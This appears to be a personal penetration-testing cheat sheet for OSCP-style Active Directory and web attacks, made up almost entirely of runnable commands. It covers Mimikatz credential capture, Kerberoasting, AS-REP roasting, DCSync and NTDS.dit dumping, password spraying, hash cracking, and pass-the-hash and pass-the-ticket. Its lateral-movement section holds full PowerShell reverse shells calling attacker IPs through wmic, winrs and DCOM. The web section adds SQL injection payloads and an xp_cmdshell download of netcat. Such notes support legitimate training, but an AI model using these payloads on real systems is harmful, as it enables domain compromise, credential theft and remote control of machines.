- See [[Windows V2#Pass-The-Hash]] for SMB pass-the-hash

---
### FTP
```bash
ftp -A 192.168.50.53 # Set FTP session as "active" (when uploading payloads; remember to also enable binary mode)
```
Attempt anonymous login using the above; `anonymous` username and empty password

```bash
ftp> bin # enable binary mode (when uploading payloads)
```

---
### Defeating Windows Credential Guard
Windows Credential Guard will encrypt domain hashes that are in memory in LSASS.exe (local user hashes are still in SAM).  Mimikatz can try to dump these hashes, but they are encrypted. Mimikatz can insert itself as a `memssp` Security Support Provider (SSP) and control the authentication request; thus seeing the credentials in plaintext.

1) Assume code execution as Mimikatz on target computer
2) `.\mimikatz.exe`
3) `privilege::debug`
4) `token::elevate` (?)
5) `misc::memssp`
6) Wait for domain user to log in
7) Check for credentials in `C:\Windows\System32\mimilsa.log

---
### Creating a PSCredential Object
1) Create SecureString
2) Create PSCredential object
3) Use credential
```PowerShell
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin
```

---
---
# Active Directory (AD)
### AD Permission Types

| Access Control Entry (ACE) | Permission                             |
| -------------------------- | -------------------------------------- |
| GenericAll                 | Full permissions on object             |
| GenericWrite               | Edit certain attributes on the object  |
| WriteOwner                 | Change ownership of the object         |
| WriteDACL                  | Edit ACE's applied to the object       |
| AllExtendedRights          | Change password, reset password, etc.  |
| ForceChangePassword        | Password change for object             |
| Self (Self-Membership)     | Add ourselves to, for example, a group |

---
### Common RIDs

| RID | Security Principal    |
| --- | --------------------- |
| 500 | Administrator account |
| 501 | Guest account         |
| 502 | `krbtgt` account      |
| 512 | Domain Admins group   |
| 513 | Domain Users group    |
| 514 | Domain Guests group   |
RID is the last part of a SID

---
### Basic Commands
```PowerShell
# If we have GenericAll or GenericWrite on another user
# We can disable Kerberos preauthentication (making the user AS-REP roastable)
Set-ADUser -Identity "username" -KerberosEncryptionType None
# Validate the above is applied (and we can proceed to AS-REP roast)
Get-ADUser -Identity "username" -Properties DoesNotRequirePreAuth

iwr -UseDefaultCredentials http://web04 # Access web SPN
```
### Basic Enumeration
```PowerShell
whoami /user # Domain SID (the whole thing minus the RID), e.g., everything minus the "XXXX": corp\jeff S-1-5-21-1987370270-658905905-1781884369-XXXX
net user /domain
net group /domain
net group <group_name> <user> /add /domain # Add user to domain group
net group <group_name> <user> /del /domain # Remove user from domain group

# Enumerate AD machines
Get-AdComputer -Filter * -Properties Name, DNSHostName, IPv4Address, OperatingSystem, OperatingSystemVersion, Enabled, LastLogonDate | Select-Object Name, DNSHostName, IPv4Address, OperatingSystem, OperatingSystemVersion, Enabled, LastLogonDate

setspn -L <user> # Enumerates SPNs in the domain for Kerberoasting (-L runs against servers and clients in the domain); alternatively use "Get-NetUser -SPN"

ls \\dc1.corp.com\sysvol\corp.com\Policies\ # View a share
cat \\FILES04\docshare\docs\do-not-share\start-email.txt # View file in a share

# Clear bad password count
# Name a computer that exists on the network where the user should be able to log into. Name user that is locked out. This works because, since you are specifying a username, NTLM will be used (even if the machine is domain-joined). This happens because Kerberos isn't supported directly in this context.
net use \\DC1 /u:maria 
```
---
### PowerView
```PowerShell
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser # This will print a lot of info
Get-NetUser "fred" # Enumerate specific domain user
Get-NetGroup | select cn # Enumerate group names
Get-NetGroup "Sales Department" | select member # Enumerate members of group
Get-NetUser | select cn,pwdlastset,lastlogon # Check for dormant users
Get-NetLocalGroup -ComputerName <target> # For remotely listing local users
Get-NetLocalGroupMember -ComputerName <target> -GroupName "Administrators" # For listing members of local groups

Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion # Enumerate machines (cleanly)
Get-NetComputer <target> # Enumerate a specific machine in detail

Find-LocalAdminAccess # Scans the network to determine if our current user has admin permissions somewhere
Get-NetSession -ComputerName <target> -Verbose # Enumerate open sessions
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Enumerates SPNs (Service Principal Names, for Kerberoasting)

Get-ObjectAcl -Identity <user> # Very noisy, consider below instead
# CHANGE input to "-Identity"; will list interesting ACLs for an identity
# How to read output: "ObjectDN" has "ActiveDirectoryRights" over "IdentityReferenceName"
Get-ObjectAcl -Identity "Management Department" -ResolveGUIDs | 
    Where-Object { $_.ActiveDirectoryRights -in @("GenericAll", "GenericWrite", "WriteOwner", "WriteDACL", "AllExtendedRights", "ForceChangePassword", "Self") } | 
    Select-Object SecurityIdentifier, 
                  ActiveDirectoryRights, 
                  @{Name="AccountName";Expression={Convert-SidToName $_.SecurityIdentifier}}

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

# Enumerating domain shares
Find-DomainShare
Find-DomainShare -CheckShareAccess # Only list domain shares we can access
# SYSVOL domain share may include files and folders that reside on the DC itself. SYSVOL is typically used for various domain policies and scripts. By default, the SYSVOL folder is mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name` on the DC and every domain user has access to it.
# WHEN A CPASSWORD IS FOUND IN SYSVOL FILES, USE gpp-decrypt

Get-DomainUser -PreauthNotRequired # Enumerate AS-REP roastable users; equivalent to impacket-GetNPUsers
Get-ADUser -Identity "username" -Properties DoesNotRequirePreAuth # Confirm a specific user is AS-REP roastable

# Request Kerberos service tickets TGS for all users with non-null SPNs
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
# Request a Kerberos service ticket TGS for the specified SPN (has Rubeus and impacket equivalents)
Get-DomainSPNTicket -SPN "HTTP/web.testlab.local"
```
---
### Impacket
```bash
impacket-GetADUsers -all "corp.com/meg:VimForPowerShell123\!" -dc-ip 192.168.176.70 # Enumerate domain users
impacket-net "corp.com/meg:VimForPowerShell123\!@192.168.176.70" user # Enumerate local users (or domain users if targeting DC)
impacket-net "corp.com/meg:VimForPowerShell123\!@192.168.176.70" group # Enumerate local groups (or domain groups if targeting DC)

impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/beet # Enumerate AS-REP roastable users; equivalent to PowerView's "Get-DomainUser -PreauthNotRequired". Rubeus has an equivalent.

sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/beet -o kerberoast.hashes # Kerberoast. If this throws error "KRB_AP_ERR_SKEW(Clock skew too great)", we need to sync the time of the Kali machine with the domain controller. Use `ntpdate` or `rdate`. Rubeus has an equivalent.

# User must be in at least one of: "Domain Admins", "Enterprise Admins", or "Administrators". IP is for DC we are targeting. Mimikatz "lsadump::dcsync" is the equivalent.
impacket-secretsdump -just-dc-user Administrator corp.com/jebadmin:"Password2023\!"@192.168.50.70

impacket-wmiexec -hashes :28e7a47a6f9f66b97b1bae4178747493 bob@172.16.211.11
impacket-wmiexec 'beyond.com/john:dqsTwTpZPn#nL@192.168.211.242'
```
---
### Sysinternals
```PowerShell
.\PsLoggedon.exe \\\\<target> # Enumerate currently logged on users
```
---
### Group Policy Preferences (decryption)
```bash
gpp-decrypt # decrypt local "cpassword" passwords on Kali
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

---
### SharpHound / BloodHound
```PowerShell
Import-Module .\Sharphound.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "oscp"

# Alternatively
powershell -ExecutionPolicy Bypass -Command "& {Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory 'C:\Users\Public' -OutputPrefix 'corp audit'}"

# EXE
.\SharpHound.exe --CollectionMethods All --OutputDirectory "C:\Users\bobby\Documents" --OutputPrefix "oscp"
```

```PowerShell
sudo neo4j start
bloodhound
```
- Find all Domain Admins
- Shortest Paths to Domain Admins from Owned Principals
- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin

BloodHound Raw Queries
```Cypher
# Show all computers detected
MATCH (m:Computer) RETURN m
# Show all users detected
MATCH (m:User) RETURN m
# Show all active sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

Troubleshooting SharpHound:
- Will NOT work with winrm shell
	- Launching a reverse shell via winrm will not work either
	- Creating a scheduled task (if admin) and having that as a reverse shell WILL work
- Must be able to access Port 389 LDAP; test LDAP connection to DC:
```PowerShell
Test-Connection -ComputerName <DC_IP> -Count 3
ping.exe -n 3 10.10.201.140 # Less likely to be blocked by Defender
```

---
### Spraying Passwords
```PowerShell
net accounts # Obtain account policies info

# This also indicates if user is a local admin on the system
netexec smb 192.168.50.75-80 -u users.txt -p 'Password123!' -d <DOMAIN.com> --continue-on-success --shares --users
netexec smb 192.168.50.75-80 -u users.txt -H <NTLM_HASH> -d <DOMAIN.com> --continue-on-success --shares --users
netexec winrm targets.lst -u users.lst -H 08d7a47a6f9f66b97b1bae4178747494 -d <DOMAIN.com> --continue-on-success

# Attempts to procure a Kerberos TGT
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Password123!"
# Enumerate (validate) users
.\kerbrute_windows_amd64.exe userenum -d corp.com usernames.txt
# Single user brute force
.\kerbrute_windows_amd64.exe bruteuser -d corp.com "jdoe" passwords.txt
# Brute force multiple users, multiple passwords
.\kerbrute_windows_amd64.exe bruteforce -d corp.com usernames.txt passwords.txt
```
---
### Rubeus
```PowerShell
# AS-REP roast. This even handles user enumeration for you
.\Rubeus.exe asreproast /nowrap /outfile:asreproast.hashes

# Kerberoast. This even handles SPN enumeration for you.
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

---
### Hashcat
```bash
# AS-REP roasted hashes
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o hashes.asreproast.cracked

# Kerberoasted hashes
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Crack DCSync hashes
sudo hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---
## Lateral Movement
### WMI & WinRM
4 different techniques:
1) WMI with `wmic` (deprecated) (**very easy**)
2) WMI with PowerShell (**fairly tedious**)
3) WinRM with `winrs` (**very easy**)
4) WinRM with PowerShell Remoting (fairly tedious but **the best** because you get a real PowerShell remote session instead of a hacky reverse shell)
#### WMI with `wmic`
- Requires DCOM (TCP 135) open 
```PowerShell
# Simple RCE
wmic /node:192.168.50.73 /user:jen /password:Password123! process call create "calc"
# Reverse Shell RCE
wmic /node:192.168.50.73 /user:jen /password:Password123! process call create "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.45.195',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\""
```
#### WMI with PowerShell
- Requires DCOM (TCP 135) open 
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
run the above, start a listener, and use the output:
```PowerShell
# Create PSCredential object
$username = 'jen';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
# Create CIM object
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.141.73 -Credential $credential -SessionOption $Options
# Invoke CIM Method
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
#### WinRM with `winrs`
User must be part of the Administrators local group OR Windows Remote Management local group (on the target). Requires WinRM (TCP 5985/5986) open.
```PowerShell
# Simple RCE
winrs -r:files04 -u:jen -p:Password123!  "cmd /c hostname & whoami"
# Reverse shell RCE
winrs -r:files04 -u:jen -p:Password123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
#### WinRM with PowerShell Remoting
- Requires WinRM (TCP 5985/5986) open.
```PowerShell
# Create PSCredential object
$username = 'jen';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
# Invoke `New-PSSession` with PSCredential object
New-PSSession -ComputerName 192.168.141.73 -Credential $credential
# Enter PSSession
Enter-PSSession 1
```

### PSExec
Prerequisites:
1) User that authenticates to the target machine needs to be part of Administrators local group. 
2) ADMIN$ share must be available. 
3) File and Printer Sharing has to be turned on (not enabled by default but commonly used in AD environments)
```PowerShell
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Password123! cmd
```
> The `ADMIN$` share is a hidden administrative share on Windows systems that maps to the Windows installation folder—typically `C:\Windows`. This share is created by default for administrative purposes and allows remote access to the Windows directory for system management tasks.

### Pass the Hash
- Prerequisites: **Note that this will only work for servers or services using NTLM authentication, not for servers or services using Kerberos authentication.** 

> NOTE: **this method works for AD domain accounts and the built-in local `Administrator` account.** After a 2014 security update, this technique cannot be used to authenticate as any other local admin account. 

Attack:
`impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C123E Administrator@192.168.50.73`

### Overpass the Hash
No special commands; see [[War Plan Gold (AD)]] for technique.

### Pass the Ticket
``` PowerShell
sekurlsa::tickets /export # Dump tickets

dir *.kirbi # Filter for TGS files
# Import ticket (ideally from a user other than your own)
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
- `klist` to verify ticket import. Verify access, e.g., `ls \\web04\backup`

#### DCOM
- User must be a local admin on the target machine; DCOM (TCP 135) open
```PowerShell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73")) # Modify IP to target machine

# Simple RCE
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

# Reverse Shell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
---
### Shadow Copies
Must be **Backup Operator** or **Domain Admin**. We will get 2 things: `ntds.dit` file and SYSTEM hive file
```PowerShell
vshadow.exe -nw -p C:
# Note the "Shadow copy device name". Append `\windows\ntds\ntds.dit` to it. Example in Step 2 below.
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak` # Run this in Administrative cmd.exe (saves AD database to location)
reg.exe save hklm\system c:\system.bak # Run in Administrative cmd.exe
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL # Outputs NTLM hashes and Kerberso key for every AD user
```

---
### AD Recycle Bin (to CSV)
```PowerShell
# List of target computers
$Computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name

foreach ($Computer in $Computers) {
    Invoke-Command -ComputerName $Computer -ScriptBlock {
        Get-ChildItem -Path 'C:\$Recycle.Bin' -Force -Recurse |
        Select-Object FullName, Length, LastWriteTime
    } -ErrorAction SilentlyContinue
}

$Results = foreach ($Computer in $Computers) {
    Invoke-Command -ComputerName $Computer -ScriptBlock {
        Get-ChildItem -Path 'C:\$Recycle.Bin' -Force -Recurse |
        Select-Object @{Name='ComputerName';Expression={$env:COMPUTERNAME}}, FullName, Length, LastWriteTime
    } -ErrorAction SilentlyContinue
}
$Results | Export-Csv "RecycleBinReport.csv" -NoTypeInformation
```

---






---
---
# Web
`curl` auto-encode query parameters with:
```bash
curl http://192.168.170.11/project/uploads/users/761997-backdoor.php --data-urlencode "cmd=which nc"
```
equivalent to:
```bash
curl http://192.168.170.11/project/uploads/users/761997-backdoor.php?cmd=which%20nc
```

---

- Also force SMB auth via file upload in web app:
	- For example, when we discover a file upload form in a web application on a Windows server, we can try to enter a non-existing file with a UNC path like `\\192.168.119.2\share\nonexistent.txt`. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server.

- SQL webshell write to file
- SQL count columns
- SQL instructions for using database, describing tables, etc.
- When enumerating tables in all databases, use `table_name,table_schema` as table_schema will show you which schema it is part of
- SQL test payloads
	- `' OR 1=1;-- `
		- But this is to auto-login, and it will not throw an error for error-based SQLi
	- `'`
		- Regular single quote should break SQL syntax and throw error for error-based SQLi
- PSQL goated payload:
	- `' AND (SELECT passwd FROM pg_shadow LIMIT 1 OFFSET 0)::int=1;-- `
- SQL stacked queries [[Stacked Based Injection]]
	- Force download of binary: `';EXEC xp_cmdshell "certutil -urlcache -f http://Kali_IP/nc64.exe c:/windows/temp/nc64.exe";--`
		- You may not see output of stacked queries but they still run; you will see target/victim pulling your binary
	- Likely enabled by default on MSSQL
	- Disabled by default on MySQL; requires `MULTI_STATEMENTS` enabled
	- Enabled by default on PSQL
